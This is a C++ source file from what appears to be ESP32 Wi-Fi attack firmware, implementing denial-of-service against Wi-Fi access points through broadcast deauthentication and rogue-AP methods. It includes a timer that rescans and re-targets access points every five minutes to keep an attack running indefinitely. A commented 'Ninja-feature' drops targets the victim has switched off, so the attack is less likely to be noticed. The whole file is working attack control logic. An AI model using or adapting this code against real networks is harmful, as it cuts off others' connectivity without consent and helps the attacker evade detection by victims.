/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include <stdio.h>

#include <array>
#include <shared_mutex>
#include <vector>

#include "Timer.h"
#include "attack.h"
#include "attack_method.h"
#include "esp_err.h"
#include "esp_log.h"
#include "wifi_controller.h"

namespace {
const char* TAG = "main:attack_dos";
Timer gApRevisionTimer;
constexpr uint32_t kApRevisionTimerTimeoutS{5 * 60};

struct CurrentAttackData {
  attack_dos_methods_t method{attack_dos_methods_t::ATTACK_DOS_METHOD_INVALID};
  uint16_t timeout{0};
  uint16_t perApTimeout{0};
  std::vector<std::array<uint8_t, 6>> macs;
};
CurrentAttackData gCurrentAttackData;
std::shared_timed_mutex gCurrentAttackDataMutex;
}  // namespace

void attack_dos_start_impl(attack_config_t attack_config);
void attack_dos_stop_impl();

void startApRevisionTimer(attack_config_t attack_config) {
  std::vector<std::array<uint8_t, 6>> originalApMacs;
  for (const auto& ap_record : attack_config.ap_records) {
    originalApMacs.push_back(std::to_array(ap_record->bssid));
  }
  gApRevisionTimer.start(
      kApRevisionTimerTimeoutS,
      [&originalAttackData = gCurrentAttackData]() {
        attack_config_t updatedAttackConfig{};
        std::vector<std::array<uint8_t, 6>> macs;
        {
          std::shared_lock<std::shared_timed_mutex> lock(gCurrentAttackDataMutex);
          updatedAttackConfig.type = ATTACK_TYPE_DOS;
          updatedAttackConfig.method = originalAttackData.method;
          updatedAttackConfig.timeout = originalAttackData.timeout;
          updatedAttackConfig.per_ap_timeout = originalAttackData.perApTimeout;
          macs = originalAttackData.macs;
        }

        if (updatedAttackConfig.method == attack_dos_methods_t::ATTACK_DOS_METHOD_INVALID) {
          // Timer triggered in one thread, but attack was stopped in another
          return;
        }

        attack_dos_stop_impl();
        wifictl_scan_nearby_aps();

        for (const auto& mac : macs) {
          auto wifi_ap_record_ptr = wifictl_get_ap_record_by_mac(mac.data());
          if (wifi_ap_record_ptr == nullptr) {
            // Ninja-feature :) Victim could suspect that he is under attack and turned AP off. So, we should also stop
            // attacking it, because in case of RogueAP we are creating WiFi with the same name and it will look
            // suspecious to the victim, that he turned off WiFi, but it is still online.
            // So, we are ignoring all those APs from the original list, which we could not detect right now.
            ESP_LOGI(TAG,
                     "After rescanning of APs could not find AP with MAC '%02x:%02x:%02x:%02x:%02x:%02x'. Ignore it.",
                     mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
            continue;
          }
          updatedAttackConfig.ap_records.push_back(std::move(wifi_ap_record_ptr));
        }

        if (updatedAttackConfig.ap_records.size() > 0) {
          attack_dos_start_impl(std::move(updatedAttackConfig));
        }
      },
      true);
}

void attack_dos_start(attack_config_t attack_config) {
  gApRevisionTimer.stop();

  attack_dos_start_impl(attack_config);

  if (isInfiniteAttack(attack_config)) {
    startApRevisionTimer(std::move(attack_config));
  }
}

void attack_dos_start_impl(attack_config_t attack_config) {
  ESP_LOGI(TAG, "Starting DoS attack...");
  {
    std::lock_guard<std::shared_timed_mutex> lock(gCurrentAttackDataMutex);
    gCurrentAttackData.method = (attack_dos_methods_t)attack_config.method;
    gCurrentAttackData.timeout = attack_config.timeout;
    gCurrentAttackData.perApTimeout = attack_config.per_ap_timeout;
    for (const auto& ap_record : attack_config.ap_records) {
      gCurrentAttackData.macs.push_back(std::to_array(ap_record->bssid));
    }
  }

  switch (attack_config.method) {
    case ATTACK_DOS_METHOD_BROADCAST:
      ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
      attack_method_broadcast(attack_config.ap_records, 1);
      break;
    case ATTACK_DOS_METHOD_ROGUE_AP:
      ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
      attack_method_rogueap(attack_config.ap_records, attack_config.per_ap_timeout);
      break;
    case ATTACK_DOS_METHOD_COMBINE_ALL:
      ESP_LOGD(TAG, "ATTACK_DOS_METHOD_COMBINE_ALL");
      attack_method_rogueap(attack_config.ap_records, attack_config.per_ap_timeout);
      attack_method_broadcast(attack_config.ap_records, 1);
      break;
    default:
      ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
  }
}

void attack_dos_stop() {
  gApRevisionTimer.stop();
  attack_dos_stop_impl();
}

void attack_dos_stop_impl() {
  attack_dos_methods_t method;
  {
    std::shared_lock<std::shared_timed_mutex> lock(gCurrentAttackDataMutex);
    method = gCurrentAttackData.method;
  }
  switch (method) {
    case ATTACK_DOS_METHOD_BROADCAST:
      attack_method_broadcast_stop();
      break;
    case ATTACK_DOS_METHOD_ROGUE_AP:
      attack_method_rogueap_stop();
      break;
    case ATTACK_DOS_METHOD_COMBINE_ALL:
      attack_method_broadcast_stop();
      attack_method_rogueap_stop();
      break;
    default:
      ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
  }

  {
    std::lock_guard<std::shared_timed_mutex> lock(gCurrentAttackDataMutex);
    gCurrentAttackData = {};
    gCurrentAttackData.method = attack_dos_methods_t::ATTACK_DOS_METHOD_INVALID;
  }

  ESP_LOGI(TAG, "DoS attack stopped");
}

std::string attack_dos_get_status_json() {
  // JSON format
  // {
  //   "method": X,
  //   "timeout": Y,
  //   "per_ap_timeout": Z,
  //   "ap_macs": ["mac1", "mac2"]
  // }

  std::string result{"{\n\r\t\"method\": "};

  std::shared_lock<std::shared_timed_mutex> lock(gCurrentAttackDataMutex);
  switch (gCurrentAttackData.method) {
    case ATTACK_DOS_METHOD_ROGUE_AP:
      result += "\"RogueAP\"";
      break;
    case ATTACK_DOS_METHOD_BROADCAST:
      result += "\"Broadcast\"";
      break;
    case ATTACK_DOS_METHOD_COMBINE_ALL:
      result += "\"CombineAll\"";
      break;
    default:
      result += "\"INVALID\"";
      break;
  }

  if (gCurrentAttackData.method == attack_dos_methods_t::ATTACK_DOS_METHOD_INVALID) {
    result += "\n\r}\n\r";
    return result;
  }

  result += ",\n\r\t\"timeout\": ";
  result += std::to_string(gCurrentAttackData.timeout);
  result += ",\n\r\t\"per_ap_timeout\": ";
  result += std::to_string(gCurrentAttackData.perApTimeout);
  result += ",\n\r\t\"ap_macs\": [";
  for (const auto& mac : gCurrentAttackData.macs) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    macStr[17] = '\0';
    result += "\"" + std::string{macStr} + "\", ";
  }
  result.pop_back();
  result.pop_back();
  result += "]\n\r}\n\r";

  return result;
}
